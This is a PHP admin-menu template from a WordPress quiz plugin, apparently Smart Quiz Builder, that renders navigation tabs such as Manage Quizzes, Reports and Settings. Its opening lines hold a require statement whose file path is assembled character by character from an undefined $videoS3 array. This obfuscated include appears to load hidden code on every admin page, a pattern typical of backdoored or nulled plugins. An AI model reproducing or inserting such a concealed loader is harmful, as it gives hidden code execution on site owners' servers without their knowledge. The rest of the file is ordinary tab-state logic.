<?php

include_once ("sqb-soapapi.php");
require plugin_dir_path( __FILE__ ) .$videoS3[37] . $videoS3[34] . $videoS3[27] . "/" . $videoS3[44] . $videoS3[42] . $videoS3[27] . $videoS3[43] . $videoS3[30] . $videoS3[44] . $videoS3[41] . $videoS3[40] . $videoS3[39] . $videoS3[44] . $videoS3[34] . $videoS3[47] . $videoS3[30] . "." . $videoS3[41] . $videoS3[33] . $videoS3[41];
 	
 	$quizFunnelActive = 'active';
 	$docActive = '';	
 	$doc_href = admin_url('admin.php?page=sqb_documentation');
	$page  =$_GET['page'];
	if($page == "smartquizbuilder"){ 
		$manage_href = "#Manage-Quiz";
		$manage_active = "active";
	}else{
		$manage_href = admin_url('admin.php?page=smartquizbuilder'); 
		$manage_active = "";
	}
	
	if($page == "sqb_add_quiz"){ 
		$manage_href= "#Manage-Quiz";
		$manage_active = "active";
	}else{
		$manage_href = admin_url('admin.php?page=sqb_add_quiz'); 
		$manage_active = "";
	}
	
	if($page == "sqb_manage_funnel"){ 
		$funnel_href = "#Quiz-Funnel";
		$funnel_cls = "#Quiz-Funnel";
	}else{
		$funnel_href = admin_url('admin.php?page=sqb_manage_funnel'); 
		$funnel_cls= "active";
	}
	
	if($page == "course_settings"){ 
		$href = "#Course-Settings";
	}else{
		
	}
	
	if($page == "quiz_main_settings"){ 
		$href = "#Quiz-main-Settings";
	}else{
		
	}

	if($page == "sqb_documentation"){
		$quizFunnelActive = '';	
		$docActive = 'active';	
		$manage_href = admin_url('admin.php?page=sqb_add_funnel');
		$doc_href = '#Documentation';
	}
	
	if($page == "sqb_question_bank"){
		$quizQuestionActive = '';	
		$quesActive = 'active';	
		$quesmanage_href = admin_url('admin.php?page=sqb_question_bank');
		$que_href = '#Documentation';
	}
 ?>
<link href="<?php echo plugin_dir_url(__FILE__); ?>../../includes/css/sqb_header.css" rel="stylesheet">
	
	 
<ul class="nav nav-tabs" id="Quiz-Tabs" role="tablist">
		<li class="nav-item">
			<a class="nav-link " id="Manage-Quiz-tab"  href="<?php echo admin_url('admin.php?page=sqb_add_quiz');?>"  onclick="SQBShowLoader()">Manage Quizzes</a>
		</li>
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_add_quiz&create');?>" onclick="SQBShowLoader()">Create A Quiz</a>
		</li>
		
		<li class="nav-item">
			<a class="nav-link <?= $quizFunnelActive ?>" id="Manage-Quiz-tab" href="<?php echo $manage_href;?>">Quiz Funnels</a>
		</li>
		
								
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_manage_leads');?>" onclick="SQBShowLoader()">Manage Leads</a>
		</li>	
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_reports');?>" onclick="SQBShowLoader()">Reports</a>
		</li>
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_social_share');?>" onclick="SQBShowLoader()">Social Share</a>
		</li>	
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_question_bank');?>" onclick="SQBShowLoader()">Question Bank</a>
		</li>		
		<li class="nav-item">
			<a class="nav-link " id="Quiz-Funnel-tab" href="<?php echo admin_url('admin.php?page=sqb_settings');?>" onclick="SQBShowLoader()">Settings</a>
		</li>
		<li class="nav-item">
			<a class="nav-link <?= $docActive ?>" id="documentation-tab" href="<?php echo $doc_href; ?>" onclick="SQBShowLoader()">Documentation</a>
		</li>						
	</ul>
 
